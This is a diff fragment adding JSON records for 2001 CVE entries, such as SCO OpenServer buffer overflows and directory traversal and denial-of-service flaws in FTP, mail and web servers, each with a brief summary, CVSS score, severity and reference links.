+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": "CWE-119",
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0407.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6292",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0407.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0577",
+      "summary": "recon in SCO OpenServer 5.0 through 5.0.6 can allow a local attacker to gain additional privileges via a buffer overflow attack in the first command line argument.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0410.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6289",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0410.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0578",
+      "summary": "Buffer overflow in lpforms in SCO OpenServer 5.0-5.0.6 can allow a local attacker to gain additional privileges via a long first argument to the lpforms command.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0416.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6293",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0416.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0579",
+      "summary": "lpadmin in SCO OpenServer 5.0.6 can allow a local attacker to gain additional privileges via a buffer overflow attack in the first argument to the command.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0421.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6291",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0421.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0580",
+      "summary": "Hughes Technologies Virtual DNS (VDNS) Server 1.0 allows a remote attacker to create a denial of service by connecting to port 6070, sending some data, and closing the connection.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0050.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0050.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0581",
+      "summary": "Spytech Spynet Chat Server 6.5 allows a remote attacker to create a denial of service (crash) via a large number of connections to port 6387.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0051.html",
+        "http://www.securityfocus.com/bid/2701",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6509",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0051.html",
+        "http://www.securityfocus.com/bid/2701"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0582",
+      "summary": "Ben Spink CrushFTP FTP Server 2.1.6 and earlier allows a local attacker to access arbitrary files via a '..' (dot dot) attack, or variations, in (1) GET, (2) CD, (3) NLST, (4) SIZE, (5) RETR.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0036.html",
+        "http://www.kb.cert.org/vuls/id/110803",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6495",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-05/0036.html",
+        "http://www.kb.cert.org/vuls/id/110803"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0583",
+      "summary": "Alt-N Technologies MDaemon 3.5.4 allows a remote attacker to create a denial of service via the URL request of a MS-DOS device (such as GET /aux) to (1) the Worldclient service at port 3000, or (2) the Webconfig service at port 3001.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0188.html",
+        "http://ftp1.deerfield.com/pub/mdaemon/Archive/3.5.6/",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6240",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0188.html",
+        "http://ftp1.deerfield.com/pub/mdaemon/Archive/3.5.6/"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0584",
+      "summary": "IMAP server in Alt-N Technologies MDaemon 3.5.6 allows a local user to cause a denial of service (hang) via long (1) SELECT or (2) EXAMINE commands.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0365.html",
+        "http://www.securityfocus.com/bid/2508",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6279",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0365.html",
+        "http://www.securityfocus.com/bid/2508"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0585",
+      "summary": "Gordano NTMail 6.0.3c allows a remote attacker to create a denial of service via a long (>= 255 characters) URL request to port 8000 or port 9000.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0248.html",
+        "http://www.securityfocus.com/bid/2494",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6249",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0248.html",
+        "http://www.securityfocus.com/bid/2494"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0586",
+      "summary": "TrendMicro ScanMail for Exchange 3.5 Evaluation allows a local attacker to recover the administrative credentials for ScanMail via a combination of unprotected registry keys and weakly encrypted passwords.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/ntbugtraq/2001-q1/0049.html",
+        "http://www.osvdb.org/5581",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6311",
+        "http://archives.neohapsis.com/archives/ntbugtraq/2001-q1/0049.html",
+        "http://www.osvdb.org/5581"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0587",
+      "summary": "deliver program in MMDF 2.43.3b in SCO OpenServer 5.0.6 can allow a local attacker to gain additional privileges via a buffer overflow in the first argument to the command.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0418.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html",
+        "http://www.securityfocus.com/bid/2583",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6302",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0418.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0588",
+      "summary": "sendmail 8.9.3, as included with the MMDF 2.43.3b package in SCO OpenServer 5.0.6, can allow a local attacker to gain additional privileges via a buffer overflow in the first argument to the command.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0417.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0417.html",
+        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0589",
+      "summary": "NetScreen ScreenOS prior to 2.5r6 on the NetScreen-10 and Netscreen-100 can allow a local attacker to bypass the DMZ 'denial' policy via specific traffic patterns.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0375.html",
+        "http://www.osvdb.org/1780",
+        "http://www.securityfocus.com/bid/2523",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6317",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0375.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0591",
+      "summary": "Directory traversal vulnerability in Oracle JSP 1.0.x through 1.1.1 and Oracle 8.1.7 iAS Release 1.0.2 can allow a remote attacker to read or execute arbitrary .jsp files via a '..' (dot dot) attack.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0239.html",
+        "http://www.securityfocus.com/bid/2286",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5986",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-02/0239.html",
+        "http://www.securityfocus.com/bid/2286"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0593",
+      "summary": "Anaconda Partners Clipper 3.3 and earlier allows a remote attacker to read arbitrary files via a '..' (dot dot) attack in the template parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://anacondapartners.com/cgi-local/apexec.pl?template=ap_releasenotestemplate.html&f1=ap_af_updates_menu&f2=ap_af_releasenotes_clip",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0395.html",
+        "http://www.securityfocus.com/bid/2512",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6286",
+        "http://anacondapartners.com/cgi-local/apexec.pl?template=ap_releasenotestemplate.html&f1=ap_af_updates_menu&f2=ap_af_releasenotes_clip"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0605",
+      "summary": "Headlight Software MyGetright prior to 1.0b allows a remote attacker to upload and/or overwrite arbitrary files via a malicious .dld (skins-data) file which contains long strings of random data.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=98321819112158&w=2",
+        "http://marc.info/?l=bugtraq&m=98321819112158&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0606",
+      "summary": "Vulnerability in iPlanet Web Server 4.X in HP-UX 11.04 (VVOS) with VirtualVault A.04.00 allows a remote attacker to create a denial of service via the HTTPS service.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-08-22",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/hp/2001-q1/0041.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6110",
+        "http://archives.neohapsis.com/archives/hp/2001-q1/0041.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6110"
       ],
       "vulnerableProducts": [],
       "isExploited": false
